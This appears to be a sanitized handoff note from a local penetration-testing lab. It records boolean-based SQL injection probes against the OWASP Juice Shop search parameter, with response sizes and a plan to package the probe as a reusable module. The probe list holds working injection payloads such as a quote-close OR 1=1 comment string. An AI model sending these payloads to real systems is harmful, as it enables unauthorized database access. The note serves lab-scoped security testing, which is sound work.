> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# Juice Shop q parameter bounded SQLi behavior wave

Date: 2026-05-22
Route/tool: Hermes -> SSH to `kali-linux-2026.1-virtualbox-amd64` (`<lab-ip>`) -> authorized local victim `<victim-vm>` (`<lab-ip>`) Juice Shop.
Source lineage: GitHub/Arjun-inspired parameter discovery lane from `handoff/script_acquisition_wave2_20260522.md`, using discovered `q` parameter from `<artifact-output-dir>/source_driven_param_discovery_fallback_retry_20260522T110522Z/`.

## Boundary

- Local lab only.
- No public target.
- No raw Exploit-DB script execution.
- No credential theft, no persistence, no destructive state change.
- Candidate/verification artifact only; not a report-ready finding.

## Target

`http://<lab-ip>:3000/rest/products/search?q=...`

## Probes

Executed bounded GET probes from Kali attacker VM:

1. baseline empty `q=`
2. normal search `q=apple`
3. single quote probe `q='`
4. boolean true probe `q=')) OR 1=1--`
5. boolean false probe `q=')) AND 1=2--`

Script copied from `tmp/juice_q_sqli_probe.py` into the artifact directory before execution.

## Artifact

`<artifact-output-dir>/juice_q_sqli_bounded_wave_20260522T110815Z/`

Key files:

- `probe.py`
- `summary.txt`
- `results.json`
- `*.body.txt` response samples
- `post_health.txt`

## Observed results

Raw summary:

```text
baseline_empty: status=200 len=16563 indicators=['SELECT', 'WHERE'] sha256=0cecc1ae4e191a525c3e658616e53302c8338111e1e312724c0d12c4c394e13a
normal_apple: status=200 len=921 indicators=[] sha256=b7b379a188326f6b3c2a2d96fa3a3c3a2396286503db96d35d5ab7a605787fb6
single_quote_error_probe: status=200 len=30 indicators=[] sha256=20bc1392a17b383b46fffc33c8e796755452883bfcfc2d33c90342ea70227639
boolean_true_probe: status=200 len=21581 indicators=['SELECT', 'WHERE'] sha256=73be112913bc3beae4d7322ed35938deb44fc6b539acd4d8c5037253d4fff3db
boolean_false_probe: status=200 len=30 indicators=[] sha256=20bc1392a17b383b46fffc33c8e796755452883bfcfc2d33c90342ea70227639
```

Post-health:

```text
http://<lab-ip>:3000/ 200
http://<lab-ip>:8080/WebGoat/ 302
```

## Interpretation

Useful signal is differential boolean behavior on the discovered `q` parameter:

- `normal_apple` returned a small product result (`len=921`).
- `boolean_true_probe` returned a much larger response (`len=21581`).
- `boolean_false_probe` matched the short empty/error-like response (`len=30`).

The script's generic `SELECT`/`WHERE` indicator is noisy because those strings can appear in returned product text, so do not rely on it alone. The stronger signal is the true/false response-size differential with stable HTTP 200 responses.

Classification: local-lab candidate SQL injection behavior / boolean differential proof on Juice Shop search parameter.

## Project benefit

- Shows how the vulnerability-source library can feed a real local-lab proof chain:
  `GitHub tool/source recommendation -> bounded parameter discovery -> selected parameter -> one-vulnerability behavior probe`.
- Keeps the route script-first and artifact-backed without raw exploit execution.
- Produces a candidate that can later be converted into a reusable one-vulnerability module/bundle.

## New/changed items

- New artifact: `<artifact-output-dir>/juice_q_sqli_bounded_wave_20260522T110815Z/`.
- New temporary source script: `tmp/juice_q_sqli_probe.py`.
- This handoff: `handoff/juice_q_sqli_bounded_wave_20260522.md`.

## Recommended next step

Promote this into a reusable module/bundle only if useful:

- `scripts/lab_modules/lab_juice_shop_search_sqli_boolean_probe.py`
- bundle: `modules/bundles/verified_lab_flow_juice_shop_search_sqli_boolean.md`

Before promotion, refine response classification so product text does not cause false SQL keyword indicators.
